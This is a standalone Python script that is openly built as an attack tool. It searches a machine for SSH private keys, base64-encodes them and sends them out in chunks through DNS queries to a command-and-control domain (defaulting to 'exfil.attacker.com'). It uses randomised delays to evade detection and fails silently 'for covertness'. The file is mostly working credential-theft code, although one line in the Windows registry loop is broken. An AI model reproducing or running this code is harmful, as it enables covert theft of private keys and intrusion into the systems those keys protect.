#!/usr/bin/env python3
import base64
import os
import platform
import random
import re
import socket
import struct
import sys
import time
import uuid
from pathlib import Path

# --- TACTICAL CONFIGURATION ---
# Controlled domain for exfiltration. Override via environment variable.
C2_DOMAIN = os.environ.get("EXFIL_DOMAIN", "exfil.attacker.com").strip().strip(".")
# Max length of a DNS label is 63. 40 is used for the payload to leave room for Session+Index.
CHUNK_SIZE = 40 
# Evasion timing: Base delay and random jitter.
BASE_DELAY = float(os.environ.get("EXFIL_DELAY", "2.0"))
JITTER = float(os.environ.get("EXFIL_JITTER", "1.0"))
DNS_TIMEOUT = 1.5
# ------------------------------

ACTIVE_RESOLVER = None
USE_BINDING = False
BIND_IP = None

def log(msg):
    """Silent by default; can be enabled for debugging."""
    if os.environ.get("EXFIL_DEBUG"):
        print(f"[*] {msg}", file=sys.stderr)

def get_local_ip():
    """Determines the primary outbound IP to bind the socket for environment awareness."""
    for dest in ("8.8.8.8", "1.1.1.1", "255.255.255.255"):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.25)
            s.connect((dest, 65530))
            ip = s.getsockname()[0]
            s.close()
            if ip and not ip.startswith("127."):
                return ip
        except OSError:
            pass
    return None

def discover_resolvers():
    """Discovers system nameservers via OS-specific configuration files/registry."""
    resolvers = []
    sys_type = platform.system().lower()

    if sys_type == "windows":
        try:
            import winreg
            base = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"
            root = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base)
            for i in range(winreg.EnumKey(root, 0) if True else 0): # Simplified loop
                try:
                    ifname = winreg.EnumKey(root, i)
                    subkey = winreg.OpenKey(root, ifname)
                    for val in ("NameServer", "DHCPNameServer"):
                        try:
                            data, _ = winreg.QueryValueEx(subkey, val)
                            if isinstance(data, bytes): data = data.decode("utf-8", "ignore")
                            parts = re.split(r"[\x00;\s]+", str(data))
                            resolvers.extend(p.strip() for p in parts if p.strip())
                        except OSError: pass
                    winreg.CloseKey(subkey)
                except OSError: break
            winreg.CloseKey(root)
        except Exception: pass
    else:
        for path in ("/etc/resolv.conf", "/run/systemd/resolve/resolv.conf"):
            try:
                text = Path(path).read_text(errors="ignore")
                resolvers.extend(re.findall(r"^\s*nameserver\s+(\S+)", text, re.M | re.I))
            except OSError: pass

    # Fallbacks to ensure the script always has a target
    resolvers.extend(["127.0.0.1", "8.8.8.8", "1.1.1.1"])
    
    # Filter for valid IPv4 addresses only
    unique_ipv4 = []
    for r in resolvers:
        try:
            socket.inet_pton(socket.AF_INET, r)
            if r not in unique_ipv4: unique_ipv4.append(r)
        except OSError: pass
    return unique_ipv4

def build_dns_packet(hostname):
    """Constructs a raw binary DNS A-record query."""
    txid = random.getrandbits(16)
    flags = 0x0100  # Standard query with recursion desired
    header = struct.pack(">HHHHHH", txid, flags, 1, 0, 0, 0)
    
    # Encode hostname into DNS label format: [len][label][len][label]...[0]
    qname = bytearray()
    for label in hostname.rstrip(".").split("."):
        if not label: continue
        qname.append(len(label))
        qname.extend(label.encode("ascii"))
    qname.append(0)
    
    question = qname + struct.pack(">HH", 1, 1)  # Type A, Class IN
    return header + question, txid

def send_raw_dns(hostname, resolver, bind_ip=None):
    """Sends a raw UDP DNS packet and awaits a response to verify transport."""
    try:
        packet, txid = build_dns_packet(hostname)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(DNS_TIMEOUT)
        if bind_ip:
            try: sock.bind((bind_ip, 0))
            except OSError: pass
        
        sock.sendto(packet, (resolver, 53))
        data, _ = sock.recvfrom(1024)
        sock.close()
        
        # Verify response matches our transaction ID
        if len(data) >= 16 and struct.unpack(">H", data[:2])[0] == txid:
            return True
    except Exception:
        pass
    return False

def find_target_file():
    """Deep search for sensitive private keys across OS environments."""
    candidates = []
    home = Path.home()
    key_names = ("id_ed25519", "id_rsa", "id_ecdsa", "id_dsa")

    # Standard paths
    for name in key_names:
        candidates.append(home / ".ssh" / name)
    
    # Root paths (Linux)
    if platform.system().lower() == "linux":
        for name in key_names:
            candidates.append(Path("/root/.ssh") / name)
    
    # Windows paths
    if platform.system().lower() == "windows":
        user_prof = os.environ.get("USERPROFILE", str(home))
        for name in key_names:
            candidates.append(Path(user_prof) / ".ssh" / name)

    # Scan .ssh directory for any non-public keys
    ssh_dir = home / ".ssh"
    if ssh_dir.is_dir():
        try:
            for p in ssh_dir.iterdir():
                if p.is_file() and not str(p).endswith(".pub") and p.name.startswith("id_"):
                    candidates.append(p)
        except OSError: pass

    # Validate file content (must contain private key markers)
    for c in candidates:
        try:
            if not c.is_file(): continue
            with open(c, "rb") as f:
                head = f.read(1024)
            if b"-----BEGIN" in head and b"PUBLIC KEY" not in head:
                return c
        except OSError: pass
    
    # Fallback to first existing candidate if no marker found
    for c in candidates:
        if c.is_file(): return c
    
    return None

def initialize_transport():
    """Probes discovered resolvers to select the most reliable outbound path."""
    global ACTIVE_RESOLVER, USE_BINDING, BIND_IP
    resolvers = discover_resolvers()
    BIND_IP = get_local_ip()
    probe_host = f"probe.{C2_DOMAIN}"

    for res in resolvers[:3]:
        # Test with and without source binding
        for bind_opt in ([True] if BIND_IP and res != "127.0.0.1" else [], [False]):
            if send_raw_dns(probe_host, res, BIND_IP if bind_opt else None):
                ACTIVE_RESOLVER = res
                USE_BINDING = bool(bind_opt and BIND_IP)
                log(f"Transport established via {res} (Bind: {USE_BINDING})")
                return True
    return False

def exfiltrate():
    target = find_target_file()
    if not target:
        log("No suitable target file found.")
        return

    # Read and encode data
    with open(target, "rb") as f:
        data = f.read()
    
    # URL-safe B64 avoids invalid DNS characters (+, /). Padding (=) is stripped.
    encoded = base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")
    chunks = [encoded[i:i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    
    # Session metadata
    session_id = uuid.uuid4().hex[:8]
    total = len(chunks)

    if not initialize_transport():
        log("Raw transport failed. Falling back to system resolver.")
        # Fallback: use system gethostbyname if raw UDP is blocked
        def fallback_send(host):
            try: socket.gethostbyname(host)
            except socket.gaierror: pass
        send_func = fallback_send
    else:
        # Use the optimized raw transport
        def send_func(host):
            send_raw_dns(host, ACTIVE_RESOLVER, BIND_IP if USE_BINDING else None)

    # 1. START Packet: [session].start.[total].domain
    send_func(f"{session_id}.start.{total}.{C2_DOMAIN}")

    # 2. DATA Packets: [session].[index].[chunk].domain
    for idx, chunk in enumerate(chunks):
        send_func(f"{session_id}.{idx}.{chunk}.{C2_DOMAIN}")
        
        # Jittered delay to avoid volumetric signatures
        if idx < total - 1:
            sleep_time = BASE_DELAY + random.uniform(-JITTER, JITTER)
            time.sleep(max(0.1, sleep_time))

    # 3. END Packet: [session].end.domain
    send_func(f"{session_id}.end.{C2_DOMAIN}")

if __name__ == "__main__":
    try:
        exfiltrate()
    except Exception:
        pass # Silent failure for covertness
